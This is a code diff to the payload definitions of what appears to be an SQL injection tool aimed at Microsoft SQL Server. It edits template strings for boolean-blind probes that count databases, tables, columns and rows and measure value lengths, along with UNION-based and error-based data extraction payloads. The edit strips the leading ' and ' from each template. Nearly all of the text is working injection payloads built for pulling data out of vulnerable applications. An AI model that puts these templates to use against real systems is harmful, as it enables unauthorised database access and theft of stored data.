@@ -31,13 +31,13 @@ namespace SuperSQLInjection.payload
 
 
         //获取数据库数量bool方式
-        public static String bool_db_count = " and " + dbs_count + ">{len}";
+        public static String bool_db_count = " " + dbs_count + ">{len}";
         //获取表数量bool
-        public static String bool_tables_count = " and " + tables_count + ">{len}";
+        public static String bool_tables_count = " " + tables_count + ">{len}";
         //获取列数量bool
-        public static String bool_columns_count = " and " + columns_count + ">{len}";
+        public static String bool_columns_count = " " + columns_count + ">{len}";
 
-        public static String bool_datas_count = " and " + data_count + ">={len}";
+        public static String bool_datas_count = " " + data_count + ">={len}";
 
         //多字符
         public static String unicode_value = "cast(unicode(substring({data},{index},1)) as varchar(100))";
@@ -48,24 +48,24 @@ namespace SuperSQLInjection.payload
         public static String substr_value = "substring(({data}),{index},{len})";
 
         //bool方式字符长度判断
-        public static String bool_length = " and len({data})>{len}";
-        public static String bool_dataLength = " and datalength({data})>{len}";
-        public static String bool_value = " and {data}>{len}";
-        public static String check_li_value = " and len({data})<{len}";
+        public static String bool_length = " len({data})>{len}";
+        public static String bool_dataLength = " datalength({data})>{len}";
+        public static String bool_value = " {data}>{len}";
+        public static String check_li_value = " len({data})<{len}";
 
         //bool方式获取值
 
         //每个unicode值范围0-9
-        public static String bool_unicode_value = " and (substring({data},{index},1))>{len}";
+        public static String bool_unicode_value = " (substring({data},{index},1))>{len}";
         
         //获取行数据
         public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";
 
         //union获取值
-        public static String union_value = " and 1=2 union all select {data}";
+        public static String union_value = " 1=2 union all select {data}";
 
         //error方式
-        public static String error_value = " and convert(int,(char(94)+char(94)+char(33)+cast({data} as varchar(2000))+char(33)+char(94)+char(94)))=1";
+        public static String error_value = " convert(int,(char(94)+char(94)+char(33)+cast({data} as varchar(2000))+char(33)+char(94)+char(94)))=1";
 
 
         //cmd
